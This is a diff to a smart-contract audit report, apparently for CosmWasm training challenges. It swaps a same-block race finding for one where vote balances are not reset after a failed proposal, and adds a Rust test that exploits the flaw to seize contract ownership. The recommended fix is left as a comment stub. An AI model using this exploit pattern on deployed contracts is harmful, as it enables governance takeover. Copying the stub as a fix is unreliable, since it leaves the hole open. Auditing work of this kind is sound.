@@ -327,62 +327,136 @@ This will ensure that the `total_assets` variable correctly reflects the total a
 
 ### Description
 
-The provided code introduces a voting system where an owner role can be proposed and accepted if it gets 1/3 of the total supply. However, there's a timing-related vulnerability that can be exploited if two proposals are resolved in the same block.
-
-Here's a brief overview of the problem:
-
-1. User A proposes themselves as a new owner and manages to get over 1/3 of the votes.
-2. In the same block, before the proposal is resolved, user B proposes themselves as a new owner.
-3. Both proposals are resolved in the same block. Since the state is not updated immediately after the first proposal is resolved, the second proposal sees the old state and overwrites the owner set by the first proposal.
-
-This means that even if user B has no votes, they could become the owner if their proposal is resolved in the same block after a valid proposal.
+Balance is not reset, so when a proposal fails, the balance of the proposal is not returned.
 
 ### Recommendation
 
-To fix this issue, one option is to disallow a new proposal if there's already an existing one. This can be done by checking if there's a proposal in the state when the Propose message is processed. If a proposal already exists, the function should return an error.
+To fix this issue, reset the balance on proposal failures.
 
 ```rust
-pub fn propose(deps: DepsMut, env: Env, info: MessageInfo) -> Result<Response, ContractError> {
-    let current_proposal = PROPOSAL.may_load(deps.storage)?;
-
-    // Disallow new proposals if there's already an existing one
-    if current_proposal.is_some() {
-        return Err(ContractError::ProposalAlreadyExists {});
-    }
-
-    PROPOSAL.save(
-        deps.storage,
-        &Proposal {
-            proposer: info.sender.clone(),
-            timestamp: env.block.time,
-        },
-    )?;
-
-    Ok(Response::new()
-        .add_attribute("action", "New proposal")
-        .add_attribute("proposer", info.sender))
+if balance.balance >= (vtoken_info.total_supply / Uint128::from(3u32)) {
+    CONFIG.update(deps.storage, |mut config| -> StdResult<_> {
+        config.owner = current_proposal.proposer;
+        Ok(config)
+    })?;
+    response = response.add_attribute("result", "Passed");
+} else {
+    PROPOSAL.remove(deps.storage);
+    response = response.add_attribute("result", "Failed");
 }
+// reset tokens here
 ```
 
 ### Proof of concept
 
 ```rust
-// Assume A and B have enough uawesome tokens
-let propose_msg_A = ExecuteMsg::Propose {};
-let propose_msg_B = ExecuteMsg::Propose {};
-let resolve_msg = ExecuteMsg::ResolveProposal {};
+#[test]
+    fn test_vulnerability() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
 
-// User A proposes themselves as a new owner
-client.send(propose_msg_A, address_A).await.unwrap();
+        // User1 propose themselves
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
 
-// User B proposes themselves as a new owner in the same block
-client.send(propose_msg_B, address_B).await.unwrap();
+        // cannot propose second time
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap_err();
 
-// Resolving both proposals in the same block
-client.send(resolve_msg, address_A).await.unwrap();
-client.send(resolve_msg, address_B).await.unwrap();
+        // Admin votes, simulates msg from CW20 contract
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(30_000),
+            },
+            &[],
+        )
+        .unwrap();
 
-// Now, the owner should be B, even if they had no votes
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+
+        // User1 ends proposal
+        let result = app
+            .execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+
+        assert_eq!(result.events[1].attributes[2], attr("result", "Failed"));
+
+        // Check ownership transfer
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, ADMIN.to_string());
+
+        // User2 propose themselves
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
+
+        // Admin votes, simulates msg from CW20 contract
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr,
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(30_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+
+        // User1 ends proposal
+        let result = app
+            .execute_contract(
+                Addr::unchecked(USER2),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+
+        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));
+
+        // Check ownership transfer
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, USER2.to_string());
+    }
 ```
 
 ---
